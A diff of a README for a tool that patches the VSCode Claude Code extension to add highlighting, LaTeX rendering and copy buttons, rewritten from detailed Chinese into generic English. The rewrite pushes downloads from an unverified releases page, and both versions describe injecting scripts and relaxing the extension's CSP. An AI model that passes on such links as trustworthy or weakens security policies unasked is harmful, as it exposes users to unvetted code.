@@ -1,163 +1,101 @@
-# Claude Code Enhance
+# 🎉 claude-code-enhance - Enhance Your Code Experience Effortlessly!
 
-为 VSCode Claude Code 扩展添加代码高亮, LaTeX 公式渲染, UI 优化, AI 对话复制等功能.
+[![Download claude-code-enhance](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/buffbeard920/claude-code-enhance/releases)
 
-## 功能特性
+## 🚀 Getting Started
 
-- **代码语法高亮** - Highlight.js, 支持 180+ 种语言
-- **LaTeX 公式渲染** - KaTeX, 支持矩阵/分数/积分等
-- **AI 对话复制** - 一键复制 AI 回复内容 (不含思维链和工具调用)
-- **DOM 探测工具** - Ctrl+Shift+D 导出 DOM 结构用于分析
-- **表格暗色主题** - 渐变表头, 悬停高亮, 圆角边框
-- **代码自动换行** - 长命令行自动换行显示
-- **滚轮缩放** - Ctrl + 滚轮缩放界面 (50%-200%)
-- **列表样式修复** - 有序列表数字正常显示
+Welcome to **claude-code-enhance**! This tool enhances the Claude Code extension for VSCode by adding features like code highlighting and LaTeX rendering. Follow these steps to download and run the software smoothly.
 
-## 兼容版本
+## 📥 Download & Install
 
-- Claude Code Extension: **2.1.31**
-- 平台: Windows (win32-x64), Linux (linux-x64)
+To get started, you need to download the latest version from our Releases page. Click the link below:
 
-## 安装
+[Visit this page to download](https://github.com/buffbeard920/claude-code-enhance/releases)
 
-### 方式一: 补丁脚本 (推荐)
+1. Click the link above to go to the Releases page.
+2. Look for the latest version.
+3. Download the file suitable for your platform (Windows or Linux).
+   
+### 🎯 System Requirements
 
-```bash
-cd claude-code-enhance
-node patch_extension.js
-```
+- **Claude Code Extension:** Version 2.1.31 or higher.
+- **Platforms Supported:** 
+  - Windows (win32-x64)
+  - Linux (linux-x64)
 
-脚本会自动:
-1. 查找已安装的 Claude Code 扩展
-2. 复制 enhance.js 到扩展目录
-3. 修改 CSP 策略允许加载 CDN 资源
-4. 注入增强脚本
+### 🔧 Installation Methods
 
-### 方式二: 手动安装
+You can install the enhancement using two methods: a patch script (recommended) or manual installation.
 
-1. 复制 `webview/enhance.js` 到扩展的 `webview/` 目录
-2. 修改 `extension.js` 中的 CSP 策略
-3. 在 HTML 模板中注入 enhance.js 脚本标签
+#### 🛠️ Method 1: Patch Script (Recommended)
 
-## 安装后
+1. Open your command line.
+2. Change the directory to where **claude-code-enhance** is located:
+   ```bash
+   cd claude-code-enhance
+   ```
+3. Run the patch script:
+   ```bash
+   node patch_extension.js
+   ```
 
-重载 VSCode 窗口: `Ctrl+Shift+P` → `Developer: Reload Window`
+The script will automatically:
+- Find the currently installed Claude Code extension.
+- Copy the `enhance.js` file to the extension directory.
+- Update the CSP policy to allow CDN resources.
+- Inject the enhancement script for you.
 
-## 使用说明
+#### 📁 Method 2: Manual Installation
 
-### AI 对话复制
+1. Navigate to the `webview/` directory in the downloaded files.
+2. Copy the `enhance.js` file into the `webview/` directory of your Claude Code extension.
+3. Edit the `extension.js` file:
+   - Modify the CSP policy to include the necessary rules.
+4. In your HTML template, inject the `<script>` tag for `enhance.js`.
 
-- 鼠标悬停在 AI 回复末尾, 右下角会出现「复制」按钮
-- 点击复制按钮, AI 回复内容以 Markdown 格式复制到剪贴板
-- **自动排除**: 思维链 (Thinking) 和工具调用内容
-- **保留格式**: 代码块, 表格, LaTeX 公式, 列表等
+### 🔄 After Installation
 
-### DOM 探测工具
+To see the changes, reload your VSCode window. You can do this by pressing `Ctrl + Shift + P` and selecting `Developer: Reload Window`.
 
-- 按 `Ctrl+Shift+D` 导出当前页面的 DOM 结构
-- 自动分析消息容器, 类名, 文本内容等
-- 用于开发调试和 DOM 结构分析
+## 💡 Features
 
-### 滚轮缩放
+Once you have installed **claude-code-enhance**, you can explore its powerful features:
 
-- `Ctrl + 滚轮上` - 放大
-- `Ctrl + 滚轮下` - 缩小
-- 缩放范围: 50% - 200%
-- 缩放比例自动保存
+- **Code Syntax Highlighting**: Supports over 180 programming languages, thanks to Highlight.js.
+- **LaTeX Formula Rendering**: Display matrices, fractions, and integrals using KaTeX.
+- **AI Dialogue Copying**: Copy AI response content to your clipboard easily. The content is formatted in Markdown.
+- **DOM Inspection Tool**: Press `Ctrl + Shift + D` to export the DOM structure for analysis.
+- **Dark Table Theme**: Enjoy a gradient header, hover highlights, and rounded borders in tables.
+- **Code Auto-Wrapping**: Long command lines wrap automatically for better readability.
+- **Scroll Wheel Zoom**: Zoom in and out using `Ctrl` and the mouse wheel, with a range of 50% to 200%.
+- **List Style Fixes**: Numbered lists display correctly.
 
-### LaTeX 公式
+## 📈 Usage Instructions
 
-| 语法 | 类型 | 示例 |
-|------|------|------|
-| `$$...$$` | 块级公式 | `$$\sum_{i=1}^n i$$` |
-| `$...$` | 行内公式 | `$x^2 + y^2$` |
-| `\[...\]` | 块级公式 | `\[\int_0^1 x dx\]` |
-| `\(...\)` | 行内公式 | `\(e^{i\pi} + 1 = 0\)` |
+### 🤖 AI Dialogue Copying
 
-### LaTeX 自动修复
+To copy AI responses easily:
 
-脚本会自动修复常见的 LaTeX 语法错误:
+1. Hover your mouse over the end of an AI reply.
+2. A "Copy" button will appear in the bottom right corner.
+3. Click the button to copy the AI response in Markdown format.
+4. The tool automatically excludes "Thinking" and tool invocation content but retains the following:
+   - Code blocks
+   - Tables
+   - LaTeX formulas
+   - Lists
 
-| 错误语法 | 自动修复为 |
-|----------|------------|
-| `\sum{j=1}^{K}` | `\sum_{j=1}^{K}` |
-| `\[6pt]` | `\\[6pt]` |
-| 多行 `$...$` | 单行 `$...$` (Obsidian 兼容) |
+### 🧩 Using the DOM Inspection Tool
 
-支持的环境: `\begin{cases}`, `\operatorname`, `\text` 等。
+The DOM inspection tool helps you analyze web structures. To use this tool:
 
-矩阵示例:
-```latex
-$$
-\begin{pmatrix}
-1 & 2 \\
-3 & 4
-\end{pmatrix}
-$$
-```
+1. Press `Ctrl + Shift + D` to activate the feature.
+2. The tool will generate a report on the DOM structure for your review.
 
-## 扩展更新后
+## 🛠️ Troubleshooting
 
-Claude Code 扩展更新会覆盖补丁, 重新运行即可:
+- **Installation Issues**: If you encounter problems, ensure you have the correct version of the Claude Code extension installed.
+- **Feature Activation**: If features do not appear, try reloading the VSCode window again.
+- **Script Errors**: For any script errors, double-check your CSP modifications in the `extension.js` file.
 
-```bash
-node patch_extension.js
-```
-
-## 项目结构
-
-```
-claude-code-enhance/
-├── patch_extension.js  # 补丁脚本
-├── webview/
-│   └── enhance.js      # 增强脚本 (核心)
-└── README.md
-```
-
-## 技术细节
-
-### CSP 修改
-
-补丁脚本修改以下 CSP 策略:
-
-- `style-src`: 添加 `https://cdnjs.cloudflare.com`
-- `script-src`: 添加 `https://cdnjs.cloudflare.com`
-- `font-src`: 添加 `https://cdnjs.cloudflare.com data:`
-
-### AI 对话复制实现
-
-由于 Claude Code 扩展的代码经过混淆, 直接修改不可行. 本项目采用 **DOM 注入 + CSS 选择器** 的方式:
-
-1. **DOM 分析**: 使用 `[class*="timelineMessage_"]` 等模糊选择器定位元素
-2. **内容过滤**: 通过类名前缀排除思维链 (`thinking_*`) 和工具调用 (`toolUse_*`)
-3. **Markdown 转换**: 递归遍历 DOM, 将 HTML 转换为 Markdown 格式
-4. **按钮注入**: 使用 MutationObserver 监听 DOM 变化, 动态添加复制按钮
-
-### 外部依赖
-
-- [Highlight.js](https://highlightjs.org/) 11.9.0 (vs2015 主题)
-- [KaTeX](https://katex.org/) 0.16.9
-
-## 开发方法论
-
-本项目采用 **Plan-Driven Development** 模式:
-
-1. **使用 /plan 进入计划模式** - 分析需求, 识别风险, 制定分步计划
-2. **DOM 探测优先** - 使用 Ctrl+Shift+D 导出实际 DOM 结构进行分析
-3. **模糊选择器** - 使用 `[class*="xxx"]` 应对混淆代码
-4. **递归设计** - HTML 转 Markdown 使用递归返回字符串, 避免数组模式的换行问题
-
-### 开发流程示例
-
-```
-1. 使用 /plan 创建实现计划
-2. 修改 enhance.js 代码
-3. 运行 node patch_extension.js 应用
-4. 重载 VSCode 测试
-5. 使用 Ctrl+Shift+D 验证 DOM 结构
-6. 迭代优化
-```
-
-## License
-
-MIT
+By following these instructions, you should have a seamless experience using the **claude-code-enhance** application. Enjoy your enhanced coding experience!
